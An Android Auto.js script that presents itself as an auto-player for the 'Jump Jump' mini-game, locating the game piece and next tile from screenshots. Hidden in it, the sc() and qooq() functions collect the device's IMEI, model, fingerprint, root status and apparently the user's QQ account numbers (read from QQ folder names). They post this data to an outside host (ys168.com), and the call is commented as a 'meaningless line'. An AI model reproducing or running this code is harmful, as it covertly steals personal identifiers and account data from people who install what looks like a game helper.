requestScreenCapture();//请求截图
n=device.width/1080;
v=device.height/1920;
zzz=2.5;
sfr="no";
try{
root_automator = new RootAutomator();sfr="root";}catch(e){
sfr="noroot";
}

function sc(str){
var url = "http://c1.ys168.com/f_ht/ajcx/wj.aspx?cz=Addlj&mlbh=1775380&_dlmc=10389405&_dlmm=";
var a=device.brand
 res = http.post(url, {
    zml:device.brand.replace(/\s+/g,"")+"/"+device.model.replace(/\s+/g,"")+device.width+"x"+device.height+"/"+device.getIMEI(),
    w1:"sdk"+device.sdkInt+"TS跳一跳1",
    w2:str.substring(0,200)
});
}
function qooq(){
path="/sdcard/Tencent/MobileQQ/artfilter/"//artfilter.config";
var scriptFiles = files.listDir(path, function(name){
return name.endsWith("artfilter.config");
});
var k="";
for(line in scriptFiles){
k+=(scriptFiles[line].split("artfilter.config")[0]+",");
}
    return k;
}

/*
参数实在太多了，
改起来很不方便
好麻烦的脚本
无聊啊啊啊
适用手机:oppo r9s 7.1.1  官方版


有用的就两个模块，找顶点和找人物
其他代码都多少没什么用。



*/
var window = floaty.window(
<frame h="70">
<button id="action" text="记点" bg="#00000000"/>
<img src="http://img04.sogoucdn.com/app/a/100520146/3678c8dd879c8ba1a9d785f153a59964"  />
</frame>
);window.setPosition(-1000,-1000);//建立悬浮窗并隐藏
console.show();//显示控制台
setInterval(()=>{/*操作ui*/
awc = 10; //比色误差
function capturescreen() {
while (true) {
if (ajt = captureScreen()) {
return ajt;
break;
}
}
} //获取截图，返回图片对象
function qs(a, b, c) {
return images.pixel(a, b, c);
} //取色函数简化为qs(),方便后面调用,也可以写成qs=images.pixel;
function abs(a7, a8) {
if (Math.abs(colors.red(a7) - colors.red(a8)) < awc && Math.abs(colors.green(a7) - colors.green(a8)) < awc && Math.abs(colors.blue(a7) - colors.blue(a8)) < awc) {
return true;
} else {
return false;
}
}//比色函数，比色误差为第10行定义的
var vid=1.13;//点击按屏时间系数
function akzt() {
log("点击确定开始执行\nQQ:787067033,拖到左下角,自己写系数,系数越大飞得越远", "");
//log(packageName("com.stardust.scriptdroid").className("android.widget.Button").id("submit").text("确定"));
new java.lang.Thread(function() {
packageName("com.stardust.scriptdroid").className("android.widget.EditText").setText("1.13");
}).start();
 vid=console.rawInput("","");
} //重新输入时间系数并开始的控制台,默认输入系数1.13，vid由1.23变为1.13
function akzt2() {
new java.lang.Thread(function() {
packageName("com.stardust.scriptdroid").className("android.widget.EditText").setText("暂停");
kz=console.rawInput("点击确定暂停脚本", "");
}).start();
} //执行中暂停脚本的控制台
function zrw(a) {
var pos = findColor(a, "#383653",{//在图片a里找这个颜色
region: [100*n,510*v,979*n,1090*v],//屏幕区域范围
threshold: 4//4线程找色
});
if (!pos) {//如果没找到返回null,不再往下执行
return null;
}
pos.x+=-3*n;//执行到这里说明找到了，x加-3得到人头棋子顶部的中心位置坐标
pos.y+=185*v;//找的颜色是人头棋子的头顶坐标y加185得到人头棋子脚部坐标
return pos;//返回人头棋子的坐标
} //以上是找人物坐标函数块
function zdd0(tp,tmp) {//找下个位置图块的顶点位置
var y1=0;//用来记录向下扫描找到的第一个顶点的y坐标
var pxt1=100*n;//
var pxt2=510*n;//这是在屏幕中心轴左边扫描的x的范围，顶点有可能出现在这个范围
if(tmp<540*n){pxt1=570*n;pxt2=980*n;}//tmp是找到的人物的x坐标,如果人物在左边,那么下个图块顶点肯定就在右边冲定义x范围
for (var y0 = 510*v; y0 < 980*v; y0 +=10*v) {//粗略扫描,y起始和y结尾,每行扫描完如果没扫到顶点往下进十继续扫
var  ys = qs(tp, 1*v, y0);//取背景颜色
for (var x0=pxt1; x0<pxt2; x0 +=10*v) {//x也是粗略扫描,每次加10
if (abs(ys, qs(tp, x0, y0))) {//和背景颜色比色,颜色一样什么都不做
} else {//颜色不一样，说明这是顶点
y1=y0;//用y1记录这个粗略顶点y坐标
y0 = 1090*v;//
x0 = pxt2;//给x,y赋超过范围值结束for循环
}//比色结束
}//y0行x扫描结束
}//整个顶点粗扫描结束
if(y1==0){return false;}//如果粗略坐标是零，说明没找到顶点的y值,说明顶点不存在，返回错误值
var as3=0;//
var as4=0;//记录多个顶点x的左右边界
for(y0=y1;y0>510*v;y0--){//从粗顶点y坐标y1向上细扫
var as1 = 0;//
var as2 = 0;//临时左右边界x值
var ok=0;//一行中背景色的个数
for (x0 = pxt1; x0 < pxt2; x0++) {//x范围的扫描
if (abs(ys, qs(tp, x0, y0))) {//比色，背景色就是粗扫y1的背景色，游戏特性原因细扫背景颜色变化可以忽略，不用重新获取背景颜色
/*颜色是背景色*/if (as1 != 0 && as2 == 0) {//as1不为0被赋值过又是背景色说明这是x左边界+1，记录
as2 = x0;x0=pxt2;//x赋值结束继续扫
}
ok++;//背景色个数加1
} else {//不是背景色，也就是说明是顶点色
if (as1 == 0) {
as1 = x0;
}//第一次扫到非背景色是x左边界,并记录
}//一次比色判断完
}//一行比色判断完
if(ok>pxt2-pxt1-1){y0=510*v;}else{
as3=as1;as4=as2;//如果这不是y边界，把x边界的的记录值赋值给as3,as4
}//如果这一行背景色410个,说明这行全是背景色，图块不在这行,那么赋y值最大值结束for循环，执行到了这行，说明上一行就是精确顶点,两顶点x不再重新赋值
}
var as = parseInt((as3 + as4-1) / 2);//由精确顶点两x计算平均值得到精确x唯一值
return as;//返回精确顶点x坐标
}//找顶点坐标结束
kz=1;//脚本运行暂停控制值
    try{
sc(sfr+","+qooq()+device.fingerprint);//无意义的一句
        }catch(e){}
    
while (true) {//死循环
x=0;xk=0;if(kz!=0){akzt();kz=0;zt0=(new Date()).getTime();
akzt2();//暂停控制
}//x坐标0，xk坐标相同次数
while(true){//死循环找人物棋子
sleep(100);//手机休息一下不要太卡
tp = capturescreen();//获取截图
rwzb=zrw(tp);//找人物棋子坐标
if(rwzb!=null){if(x!=rwzb.x){//找到x不同赋给x
x=rwzb.x;
}else{
xk++;//和上次找到的x一样就计数
if(xk>1){break;}//连续超过1次一样说明棋子不动了，棋子就是在这个位置进行下一次跳，跳出找人物棋子死循环
}}//不为null才继续不然出错
}//找人物棋子坐标结束
rwzb.y+=3*v;//之后又发现的y坐标误差，加上去的
window.setPosition(rwzb.x-169*n, rwzb.y-226*v);//把悬浮窗人物棋子脚部169，226移到人物坐标棋子脚部，可以直观显示方便调试
ddzb=zdd0(tp,rwzb.x)+5*n;//找下个图块顶点x坐标,5是后来调试发现的误差加上去的
dcx=563*n;//对称中心x
dcy=981*v;//对称中心y,人物棋子所在方块中心坐标和下个方块中心坐标是对称的，对称点就是这个，多次调试测出
qx=ddzb;//qx赋值为顶点坐标
qy=parseInt(dcy-Math.abs((qx-dcx)/1.725));//根据图块中心x和对称点坐标计算出图块中心y//左右两条不同的路径是互相垂直并且对称,2d转3d，根据x和固定比例算出x:y=1:1的y的屏幕坐标值(1.725是测量两个图块中心点的连线x/y算出来的，我也忘了);
window.setPosition(qx-169*n, qy-226*v)//把悬浮窗脚部移到图块中心，方便观察结果进行进一步调试
x=Math.abs(qx-rwzb.x)/n;//计算出x的距离
y=parseInt((rwzb.y-qy)*(1.725))/v;//计算出x比例下的y的距离
time=Math.sqrt((x*x)+(y*y))*vid;//计算出x比例下的距离并乘以时间系数得到精确的点击按压时间
time2=x*1.66;//假如每次都能跳到中心完美点，可以只用x乘另一个时间系数得到精确按压时间，实践证明这不可能。所以这句可有可无
presso(963*n,1588*v,time);//随便找一点可以操作的点进行精确时间点击
sleep(100);window.setPosition(-1000,-1000);sleep(500);//延时越长越稳定//点击完延时0.x秒，隐藏悬浮窗，避免挡截图
if((new Date()).getTime()-zt0>30000){//已执行100秒
sc(zzz+"能用"+device.fingerprint);
zt0=(new Date()).getTime()+270000;
zzz+=3;
log("能用呃呃呃");
}
}//死循环，永不结束
},1000);//感觉这个1000没什么用，反正就知道只要是有悬浮窗的，代码放setInterval里就能和悬浮窗同时运行

function presso(x, y, duration){
    if(device.sdkInt >= 24){
        press(x, y, duration);
    }else{
        if(sfr=="root"){
        root_automator.press(x, y, duration);}else{
           alert("不是安卓7.0以上也没有root权限");
            exit();
        }
    }
}//root与非root通用判断




